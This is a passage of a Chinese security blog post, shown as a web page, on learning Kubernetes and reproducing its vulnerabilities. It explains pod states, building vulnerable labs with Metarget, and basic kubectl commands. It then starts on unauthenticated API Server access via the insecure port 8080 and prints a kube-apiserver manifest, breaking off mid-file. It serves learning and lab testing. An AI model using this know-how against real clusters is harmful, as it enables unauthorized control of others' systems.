<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>k8s学习及漏洞复现-上 | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
function gtag(){dataLayer.push(arguments)}
gtag('js', new Date())
gtag('config', 'G-3Z9EQ7RWNS')
btf.addGlobalFn('pjaxComplete', () => {
  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
}, 'google_analytics')
</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"SFZ331F775","apiKey":"d942c1c63cb7ca27d841499faf4a0ec8","indexName":"blogsearch","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'k8s学习及漏洞复现-上',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/k8s/UzJuMarkDownImage89bb8f54fc5c96249c42867fbf9e8b88.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">k8s学习及漏洞复现-上</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">k8s学习及漏洞复现-上</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-25T06:54:04.000Z" title="发表于 2023-12-25 14:54:04">2023-12-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-17T07:40:43.620Z" title="更新于 2024-01-17 15:40:43">2024-01-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">9,421</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>42分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h4 id="k8s基础知识"><a href="#k8s基础知识" class="headerlink" title="k8s基础知识"></a>k8s基础知识</h4><h5 id="常见的pod状态"><a href="#常见的pod状态" class="headerlink" title="常见的pod状态"></a>常见的pod状态</h5><p><img src="https://pic3.zhimg.com/80/v2-9eb57d02d5fe3b5d16b84e05c60eb6de_720w.webp" alt="img"></p>
<p>pod</p>
<p><strong>pod常见的状态</strong>：<br><strong>第一阶段</strong>：<br><strong>挂起（Pending）</strong>：<br>1、正在创建Pod但是Pod中的容器还没有全部被创建完成，处于此状态的Pod应该检查Pod依赖的存储是否有权限挂载、镜像是否可以下载、调度是否正常等<br>2、我们在请求创建pod时，条件不满足，调度没有完成，没有任何一个节点能满足调度条件，已经创建了pod但是没有适合它运行的节点叫做挂起，调度没有完成。</p>
<p><strong>失败（Failed）</strong>：Pod 中的所有容器都已终止了，并且至少有一个容器是因为失败终止。也就是说，容器以非0状态退出或者被系统终止。<br><strong>未知（Unknown）</strong>：未知状态，所谓pod是什么状态是apiserver和运行在pod节点的kubelet进行通信获取状态信息的，如果节点之上的kubelet本身出故障，那么apiserver就连不上kubelet，得不到信息了，就会看Unknown，通常是由于与pod所在的node节点通信错误。</p>
<p><strong>Error 状态</strong>：Pod 启动过程中发生了错误</p>
<p><strong>成功（Succeeded）</strong>：Pod中的所有容器都被成功终止，即pod里所有的containers均已terminated。</p>
<p><strong>已终止（Terminated）</strong> 处于Terminated状态的容器已经开始执行并且或者正常结束或者因为某些原因失败。 如果你使用kubectl来查询包含Terminated状态的容器的 Pod 时， 你会看到容器进入此状态的原因、退出代码以及容器执行期间的起止时间</p>
<p><strong>第二阶段</strong>：<br><strong>Unschedulable</strong>：Pod不能被调度， scheduler没有匹配到合适的node节点<br><strong>PodScheduled</strong>：pod正处于调度中，在scheduler刚开始调度的时候，还没有将pod分配到指定的node，在筛选出合适的节点后就会更新etcd数据，将pod分配到指定的node<br><strong>Initialized</strong>：所有pod中的初始化容器已经完成了<br><strong>ImagePullBackOff</strong>：Pod所在的node节点下载镜像失败<br><strong>Running</strong>：Pod内部的容器已经被创建并且启动。</p>
<p>扩展：还有其他状态，如下：<br><strong>Evicted</strong>状态：出现这种情况，多见于系统内存或硬盘资源不足，可df-h查看docker存储所在目录的资源使用情况，如果百分比大于85%，就要及时清理下资源，尤其是一些大文件、docker镜像。<br><strong>CrashLoopBackOff</strong>：容器曾经启动了，但可能又异常退出了</p>
<h4 id="k8s-漏洞环境搭建"><a href="#k8s-漏洞环境搭建" class="headerlink" title="k8s-漏洞环境搭建"></a>k8s-漏洞环境搭建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#麻省理工大学ubuntu20 源</span></span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>



<h5 id="开源项目metarget"><a href="#开源项目metarget" class="headerlink" title="开源项目metarget"></a>开源项目<a target="_blank" rel="noopener" href="https://github.com/Metarget/metarget">metarget</a></h5><p>在研究漏洞时，我们经常会发现“环境搭建”这一步骤本身就会占用大量的时间，与之相比，真正测试PoC、ExP的时间可能非常短。由于许多官方镜像在国内的网络环境下并不方便获得，加上云原生组件自身的复杂性，在云原生安全领域，前述问题尤为明显。</p>
<p>与此同时，我们也能看到，开源社区涌现出一些优秀的安全项目，如<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">Vulhub</a>、<a target="_blank" rel="noopener" href="https://github.com/Medicean/VulApps">VulApps</a>等，将漏洞场景打包成镜像，方便研究人员开箱即用。</p>
<p>然而，这些项目主要针对应用程序漏洞。那么，如果我们需要研究的是Docker、Kubernetes、操作系统内核等底层基础设施自身的漏洞呢？这又回到了前面的环境搭建问题。</p>
<p>我们希望Metarget能够在一定程度上解决这个问题，致力于底层基础设施的脆弱场景自动化构建。在此之上，我们还希望Metarget实现对云原生环境多层次脆弱场景的自动化构建。</p>
<h6 id="安装metarget"><a href="#安装metarget" class="headerlink" title="安装metarget"></a>安装metarget</h6><p>官方已经给好了安装方式，简单操作即可，安装k8s之前要先安装docker，傻瓜式操作，一键安装。<br>这里官方推荐使用ubuntu16或者18，笔者在这里推荐必须用ubuntu18，因为笔者在ubuntu20上研究了两天利用metarget安装k8s都没有成功，中间会出现各种各样的错误。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#克隆项目</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Metarget/metarget.git</span><br><span class="line"><span class="built_in">cd</span> metaget/ </span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"><span class="comment">#这里如果没有pip3  先apt install python3-pip</span></span><br><span class="line"><span class="comment">#好像还要装一下curl    apt install curl</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20231227212433818.png" alt="image-20231227212433818"></p>
<p>在安装完依赖后，要先安装一个docker  ，不让直接装k8s是不行的。<br>用metarget 装  很简单<code>./metarget gadget install docker --version 18.03.1</code><br><img src="/images/k8s/image-20231227212726975.png" alt="image-20231227212726975"></p>
<p>在这其中，我们可以加参数，–verbose显示详细的安装过程，方便调试像这样<code>./metarget gadget install docker --version 18.03.1 --verbose</code></p>
<h5 id="k8s-一些重要的命令"><a href="#k8s-一些重要的命令" class="headerlink" title="k8s 一些重要的命令"></a>k8s 一些重要的命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在本机上查看node</span></span><br><span class="line">kubectl get node</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get node</span></span><br><span class="line">NAME              STATUS   ROLES    AGE   VERSION</span><br><span class="line">racknerd-6d0a89   Ready    master   37h   v1.16.6-beta.0</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看namespace</span></span><br><span class="line">kubectl get namespace</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get namespace</span></span><br><span class="line">NAME                   STATUS   AGE</span><br><span class="line">default                Active   37h</span><br><span class="line">kube-node-lease        Active   37h</span><br><span class="line">kube-public            Active   37h</span><br><span class="line">kube-system            Active   37h</span><br><span class="line">kubernetes-dashboard   Active   95m</span><br><span class="line">metarget               Active   24h</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看某个namespcae下有那些的pod</span></span><br><span class="line">kubectl get pods -n metarget</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get pods -n metarget</span></span><br><span class="line">NAME                                       READY   STATUS    RESTARTS   AGE</span><br><span class="line">dvwa-web-86b6ccdc69-7l6n4                  1/1     Running   0          24h</span><br><span class="line">thinkphp-5-0-23-rce-web-7bb696c45b-n52pb   1/1     Running   0          24h</span><br><span class="line"></span><br><span class="line"><span class="comment">#在某个pod上执行命令</span></span><br><span class="line">kubectl <span class="built_in">exec</span> -n metarget -it dvwa-web-86b6ccdc69-7l6n4  sh</span><br><span class="line">kubectl <span class="built_in">exec</span> -n metarget -it dvwa-web-86b6ccdc69-7l6n4  <span class="string">&quot;ls -al&quot;</span></span><br><span class="line">root@bohemian:~<span class="comment"># kubectl exec -n metarget -it dvwa-web-86b6ccdc69-7l6n4  sh</span></span><br><span class="line"><span class="comment"># php -v</span></span><br><span class="line">PHP 7.0.30-0+deb9u1 (cli) (built: Jun 14 2018 13:50:25) ( NTS )</span><br><span class="line">Copyright (c) 1997-2017 The PHP Group</span><br><span class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.30-0+deb9u1, Copyright (c) 1999-2017, by Zend Technologies</span><br><span class="line"></span><br><span class="line">kubectl <span class="built_in">exec</span> -n kube-system -it kube-apiserver-racknerd-6d0a89 sh</span><br></pre></td></tr></table></figure>



<h5 id="Api-Server-未授权访问（8080和6443）"><a href="#Api-Server-未授权访问（8080和6443）" class="headerlink" title="Api Server 未授权访问（8080和6443）"></a>Api Server 未授权访问（8080和6443）</h5><p>使用metarget 安装k8s</p>
<p><code>./metarget gadget install k8s --version=1.16.5</code></p>
<p>这个时候会出现安装成功，安装成功后，就会默认的启动很多的POD<br><img src="/images/k8s/image-20231228090220104.png" alt="image-20231228090220104"></p>
<p>相应的使用<code>netstat -tulnp</code>会显示映射了很多端口</p>
<p><img src="/images/k8s/image-20231228090418847.png" alt="image-20231228090418847"></p>
<p>默认情况，Kubernetes API Server提供HTTP的两个端口：8080，6443</p>
<p>insecure-port： 默认端口8080，在HTTP中没有认证和授权检查。<br>secure-port ：默认端口6443， 认证方式，令牌文件或者客户端证书.</p>
<p>insecure-port 默认在高版本中是不会打开的，secure-port 默认是会打开的，但是访问时存在鉴权</p>
<p><a target="_blank" rel="noopener" href="https://ip:6443/">https://ip:6443/</a> 访问这个6443端口时，如下图403<img src="/images/k8s/image-20231228090722306.png" alt="image-20231228090722306"></p>
<h6 id="8080端口未授权"><a href="#8080端口未授权" class="headerlink" title="8080端口未授权"></a>8080端口未授权</h6><p>cat /etc/kubernetes/manifests/kube-apiserver.yaml</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">control-plane</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--advertise-address=ip</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--allow-privileged=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--authorization-mode=Node,RBAC</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--client-ca-file=/etc/kubernetes/pki/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-admission-plugins=NodeRestriction</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-servers=https://127.0.0.1:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--insecure-port=0</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-allowed-names=front-proxy-client</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-extra-headers-prefix=X-Remote-Extra-</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-group-headers=X-Remote-Group</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-username-headers=X-Remote-User</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--secure-port=6443</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-account-key-file=/etc/kubernetes/pki/sa.pub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-cluster-ip-range=10.96.0.0/12</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-cert-file=/etc/kubernetes/pki/apiserver.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">k8s.gcr.io/kube-apiserver:v1.16.5</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">8</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">ip</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">6443</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">15</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">250m</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/ssl/certs</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">ca-certs</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">etc-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/usr/local/share/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">usr-local-share-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/usr/share/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">usr-share-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">priorityClassName:</span> <span class="string">system-cluster-critical</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/ssl/certs</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ca-certs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">etc-ca-certificates</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/usr/local/share/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> 